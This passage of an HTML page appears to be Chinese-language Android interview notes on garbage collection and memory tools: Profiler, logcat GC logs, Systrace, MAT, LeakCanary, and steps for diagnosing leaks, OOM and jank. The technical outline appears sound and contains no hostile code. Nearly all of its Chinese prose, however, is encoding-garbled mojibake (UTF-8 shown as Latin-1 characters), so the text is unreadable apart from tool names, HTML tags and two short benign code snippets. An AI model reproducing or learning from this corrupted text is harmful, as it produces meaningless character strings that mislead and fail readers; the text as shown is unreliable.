<li><strong>åŠŸèƒ½</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨ã€æŸ¥çœ‹GCäº‹ä»¶ã€ç”Ÿæˆå †è½¬å‚¨</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé›†æˆåœ¨Android Studioä¸­ï¼Œä½¿ç”¨æ–¹ä¾¿</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ—¥å¸¸å¼€å‘ã€æ€§èƒ½åˆ†æ</li>
</ul>
<p><strong>2. logcatï¼ˆæŸ¥çœ‹GCæ—¥å¿—ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæŸ¥çœ‹GCçš„æ—¥å¿—ä¿¡æ¯</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç®€å•ç›´æ¥ï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥çœ‹GCé¢‘ç‡ã€GCè€—æ—¶</li>
</ul>
<p><strong>3. Systraceï¼ˆåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šåˆ†æGCå¯¼è‡´çš„å¡é¡¿é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šèƒ½è¯¦ç»†åˆ†æGCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå¡é¡¿é—®é¢˜</li>
</ul>
<p><strong>4. MATï¼ˆMemory Analyzer Toolï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šåˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œæ‰¾å‡ºå†…å­˜é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šåŠŸèƒ½å¼ºå¤§ï¼Œèƒ½è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼ã€OOMé—®é¢˜</li>
</ul>
<p><strong>5. LeakCanaryï¼ˆè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè‡ªåŠ¨æ£€æµ‹åº”ç”¨ä¸­çš„å†…å­˜æ³„æ¼</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œä¸éœ€è¦æ‰‹åŠ¨åˆ†æ</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¼€å‘é˜¶æ®µè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>2. å¦‚ä½•ä½¿ç”¨Android Studio Profilerï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æ‰“å¼€Profilerçª—å£</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
</ul>
<p><strong>2. é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œ</li>
</ul>
<p><strong>3. æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶ï¼ˆä»€ä¹ˆæ—¶å€™è§¦å‘GCï¼‰</li>
</ul>
<p><strong>4. æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨å†…å­˜æ›²çº¿ä¸­ï¼ŒGCäº‹ä»¶ä¼šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼ˆGCç±»å‹ã€è€—æ—¶ç­‰ï¼‰</li>
</ul>
<p><strong>5. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç”Ÿæˆå †è½¬å‚¨æ–‡ä»¶</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATåˆ†æ</li>
</ul>
<p><strong>6. æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…</li>
</ul>
<p><strong>3. å¦‚ä½•æŸ¥çœ‹Android GCæ—¥å¿—ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨adb logcat</strong></p>
<pre><code class="hljs language-bash" lang="bash">adb logcat | grep GC
</code></pre>
<ul>
<li>ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æŸ¥çœ‹GCæ—¥å¿—</li>
<li>å¯ä»¥è¿‡æ»¤GCç›¸å…³çš„æ—¥å¿—</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šåœ¨Android Studioçš„Logcatçª—å£ä¸­æŸ¥çœ‹</strong></p>
<ul>
<li>æ‰“å¼€Logcatçª—å£</li>
<li>è¿‡æ»¤GCç›¸å…³çš„æ—¥å¿—</li>
<li>æŸ¥çœ‹GCç±»å‹å’Œè€—æ—¶</li>
</ul>
<p><strong>GCæ—¥å¿—åŒ…å«ä»€ä¹ˆï¼š</strong></p>
<ul>
<li><strong>GCç±»å‹</strong>ï¼šPartial GCã€Full GCã€Sticky GC</li>
<li><strong>GCè€—æ—¶</strong>ï¼šGCæ‰§è¡Œçš„æ—¶é—´</li>
<li><strong>å›æ”¶å‰åçš„å†…å­˜å¤§å°</strong>ï¼šå›æ”¶äº†å¤šå°‘å†…å­˜</li>
<li><strong>GCé¢‘ç‡</strong>ï¼šå¤šä¹…è§¦å‘ä¸€æ¬¡GC</li>
</ul>
<p><strong>å¦‚ä½•åˆ†æGCæ—¥å¿—ï¼š</strong></p>
<ul>
<li>æŸ¥çœ‹GCé¢‘ç‡ï¼šæ˜¯å¦é¢‘ç¹è§¦å‘GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šæ˜¯å¦æš‚åœæ—¶é—´è¿‡é•¿</li>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>å¦‚æœFull GCé¢‘ç¹ï¼Œéœ€è¦ä¼˜åŒ–</li>
</ul>
<p><strong>4. å¦‚ä½•ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æ·»åŠ ä¾èµ–</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
}
</code></pre>
<p><strong>2. è¿è¡Œåº”ç”¨</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨é›†æˆåˆ°åº”ç”¨ä¸­</li>
<li>ä¸éœ€è¦é¢å¤–é…ç½®</li>
</ul>
<p><strong>3. è‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šç›‘æ§Activityã€Fragmentç­‰å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>å½“å¯¹è±¡åº”è¯¥è¢«å›æ”¶æ—¶ï¼ŒLeakCanaryä¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦çœŸçš„è¢«å›æ”¶</li>
</ul>
<p><strong>4. å‘ç°æ³„æ¼æ—¶æ˜¾ç¤ºé€šçŸ¥</strong></p>
<ul>
<li>å¦‚æœå‘ç°å†…å­˜æ³„æ¼ï¼ŒLeakCanaryä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>ç‚¹å‡»é€šçŸ¥ï¼Œå¯ä»¥æŸ¥çœ‹æ³„æ¼è·¯å¾„</li>
<li>æ³„æ¼è·¯å¾„ä¼šæ˜¾ç¤ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>æ£€æµ‹åŸç†ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨WeakReferenceå’ŒReferenceQueue</li>
<li>å½“å¯¹è±¡è¢«GCå›æ”¶æ—¶ï¼ŒWeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>å¦‚æœå¯¹è±¡åº”è¯¥è¢«å›æ”¶ä½†æ²¡æœ‰è¿›å…¥ReferenceQueueï¼Œè¯´æ˜æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. å¦‚ä½•ä½¿ç”¨MATåˆ†æå†…å­˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨jmapå‘½ä»¤ç”Ÿæˆï¼ˆAndroidä¸å¸¸ç”¨ï¼‰</li>
</ul>
<p><strong>2. å¯¼å‡ºhprofæ–‡ä»¶</strong></p>
<ul>
<li>åœ¨Profilerä¸­ï¼Œç‚¹å‡»"Export heap dump"</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>3. ç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>ä¸‹è½½å¹¶å®‰è£…MATï¼ˆMemory Analyzer Toolï¼‰</li>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
</ul>
<p><strong>4. åˆ†æå¤§å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>5. åˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½ï¼š</strong></p>
<ul>
<li><strong>Histogram</strong>ï¼šæŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li><strong>Dominator Tree</strong>ï¼šæŸ¥çœ‹å¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li><strong>Path to GC Roots</strong>ï¼šæŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li><strong>Leak Suspects</strong>ï¼šè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>6. å¦‚ä½•æ’æŸ¥GCé¢‘ç¹é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æŸ¥çœ‹GCæ—¥å¿—ç¡®è®¤é¢‘ç‡</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆå¤šä¹…è§¦å‘ä¸€æ¬¡GCï¼‰</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>2. ä½¿ç”¨ProfileræŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
</ul>
<p><strong>3. æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
<li>å¸¸è§åœºæ™¯ï¼šå¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡ã€åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<ul>
<li><strong>é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong>ï¼šä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜ä¸è¶³ï¼Œé¢‘ç¹è§¦å‘GC</li>
<li><strong>å¹´è½»ä»£è®¾ç½®å¤ªå°</strong>ï¼šå¹´è½»ä»£å¤ªå°ï¼Œå®¹æ˜“æ»¡ï¼Œé¢‘ç¹è§¦å‘GC</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>7. å¦‚ä½•æ’æŸ¥åº”ç”¨å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ä½¿ç”¨Systraceåˆ†æå¡é¡¿</strong></p>
<ul>
<li>ä½¿ç”¨Android Studioçš„Systraceå·¥å…·</li>
<li>æˆ–ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·</li>
<li>åˆ†æå¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>2. æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</strong></p>
<ul>
<li>åœ¨Systraceä¸­æŸ¥çœ‹GCäº‹ä»¶</li>
<li>æ£€æŸ¥GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>3. å¦‚æœæ˜¯GCå¯¼è‡´çš„ï¼Œåˆ†æGCåŸå› </strong></p>
<ul>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šGCæš‚åœæ—¶é—´æ˜¯å¦è¿‡é•¿</li>
<li>åˆ†æGCåŸå› ï¼šä¸ºä»€ä¹ˆè§¦å‘GC</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘GC</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…è§¦å‘Full GC</li>
<li>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨ã€åŠ¨ç”»ç­‰åœºæ™¯</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…è§¦å‘Full GC</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ã€å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong>ï¼šViewHolderå¤ç”¨ã€é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åŠ¨ç”»</strong>ï¼šå¤ç”¨åŠ¨ç”»å¯¹è±¡ã€é¿å…é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
</ul>
<h4 data-id="heading-84">6.3 ç»¼åˆåº”ç”¨é¢˜ï¼ˆé«˜çº§ï¼‰</h4>
<h4 data-id="heading-85">6.3.1 åœºæ™¯åˆ†æé¢˜</h4>
<p><strong>1. å¦‚ä½•ä¼˜åŒ–Androidåº”ç”¨çš„GCæ€§èƒ½ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>ä¼˜åŒ–GCæ€§èƒ½éœ€è¦ä»å¤šä¸ªæ–¹é¢å…¥æ‰‹ï¼š</p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ†é…ï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li><strong>å¯¹è±¡å¤ç”¨</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li><strong>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨StringBuilderã€é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>ä½¿ç”¨åŸºæœ¬ç±»å‹</strong>ï¼šä½¿ç”¨intè€Œä¸æ˜¯Integerï¼Œbooleanè€Œä¸æ˜¯Boolean</li>
</ul>
<p><strong>2. é¿å…å†…å­˜æ³„æ¼</strong></p>
<ul>
<li><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šåœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li><strong>åŠæ—¶å–æ¶ˆæ³¨å†Œ</strong>ï¼šå–æ¶ˆæ³¨å†Œç›‘å¬å™¨ï¼ˆEventBusã€å¹¿æ’­æ¥æ”¶å™¨ï¼‰</li>
<li><strong>ä½¿ç”¨å¼±å¼•ç”¨</strong>ï¼šå¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</li>
</ul>
<p><strong>3. ä¼˜åŒ–åˆ—è¡¨å’ŒåŠ¨ç”»</strong></p>
<ul>
<li><strong>ViewHolderå¤ç”¨</strong>ï¼šç¡®ä¿RecyclerViewçš„ViewHolderæ­£ç¡®å¤ç”¨</li>
<li><strong>é¿å…é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong>ï¼šé¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>å¤ç”¨åŠ¨ç”»å¯¹è±¡</strong>ï¼šä¸è¦æ¯æ¬¡åˆ›å»ºæ–°çš„åŠ¨ç”»å¯¹è±¡</li>
</ul>
<p><strong>4. åˆç†ä½¿ç”¨ç¼“å­˜</strong></p>
<ul>
<li><strong>ä½¿ç”¨LruCache</strong>ï¼šä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>åŠæ—¶æ¸…ç†</strong>ï¼šåŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
<li><strong>é¿å…æ— é™åˆ¶ç¼“å­˜</strong>ï¼šä¸è¦æ— é™åˆ¶åœ°ç¼“å­˜æ•°æ®</li>
</ul>
<p><strong>5. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li><strong>åŠæ—¶é‡Šæ”¾</strong>ï¼šåŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li><strong>å‹ç¼©å›¾ç‰‡</strong>ï¼šåŠ è½½æ—¶å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li><strong>åˆ†æ‰¹åŠ è½½</strong>ï¼šä¸è¦ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
</ul>
<p><strong>ä¼˜åŒ–æ•ˆæœï¼š</strong></p>
<ul>
<li>å‡å°‘GCé¢‘ç‡ï¼šå‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCè§¦å‘</li>
<li>é™ä½GCæš‚åœæ—¶é—´ï¼šé¿å…Full GCï¼Œå‡å°‘GCæš‚åœæ—¶é—´</li>
<li>æå‡åº”ç”¨æµç•…åº¦ï¼šå‡å°‘GCï¼Œæå‡ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>2. å¦‚ä½•æ’æŸ¥Androidå†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. ä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆç¬¬ä¸€æ­¥ï¼‰</strong></p>
<ul>
<li>åœ¨å¼€å‘é˜¶æ®µï¼ŒLeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å¦‚æœå‘ç°æ³„æ¼ï¼Œä¼šæ˜¾ç¤ºé€šçŸ¥å’Œæ³„æ¼è·¯å¾„</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„ï¼Œå¯ä»¥å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>2. ç”Ÿæˆå †è½¬å‚¨ç”¨MATåˆ†æï¼ˆè¯¦ç»†åˆ†æï¼‰</strong></p>
<ul>
<li>å¦‚æœLeakCanaryå‘ç°æ³„æ¼ï¼Œæˆ–éœ€è¦è¯¦ç»†åˆ†æ</li>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATæ‰“å¼€åˆ†æ</li>
</ul>
<p><strong>3. æ‰¾å‡ºæ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºæ³„æ¼å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†ææ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>4. ä¿®å¤ä»£ç </strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤ä»£ç </li>
<li>å¸¸è§ä¿®å¤æ–¹æ³•ï¼š
<ul>
<li>ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</li>
<li>åŠæ—¶æ¸…ç†èµ„æºï¼ˆonDestroyä¸­æ¸…ç†ï¼‰</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>æ¸…ç†é›†åˆ</li>
</ul>
</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>LeakCanary</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°æ³„æ¼</li>
<li><strong>MAT</strong>ï¼šè¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§ï¼ŒæŸ¥çœ‹å†…å­˜å˜åŒ–</li>
</ul>
<p><strong>3. å¦‚ä½•æ’æŸ¥Android OOMé—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨OOMæ—¶ï¼Œç³»ç»Ÿå¯èƒ½è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨Android Studio Profileræ‰‹åŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>2. åˆ†æå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. æ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>æ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼š
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡è¢«å¼•ç”¨ï¼Œæ— æ³•å›æ”¶</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å¾ˆå¤§</li>
<li><strong>å¯¹è±¡å¤ªå¤š</strong>ï¼šåˆ›å»ºäº†å¤ªå¤šå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>4. ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼š
<ul>
<li>å¦‚æœæ˜¯å†…å­˜æ³„æ¼ï¼Œä¿®å¤æ³„æ¼</li>
<li>å¦‚æœæ˜¯å¤§å¯¹è±¡ï¼Œä¼˜åŒ–å¤§å¯¹è±¡ï¼ˆå‹ç¼©ã€åŠæ—¶é‡Šæ”¾ï¼‰</li>
<li>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤šï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤æ³„æ¼</li>
<li><strong>ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong>ï¼šåˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong>ï¼šå‹ç¼©å›¾ç‰‡ã€åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
</ul>
<p><strong>4. å¦‚ä½•æ’æŸ¥GCé¢‘ç¹å¯¼è‡´çš„å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. æŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆå¤šä¹…è§¦å‘ä¸€æ¬¡GCï¼‰</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>2. ä½¿ç”¨Systraceåˆ†æ</strong></p>
<ul>
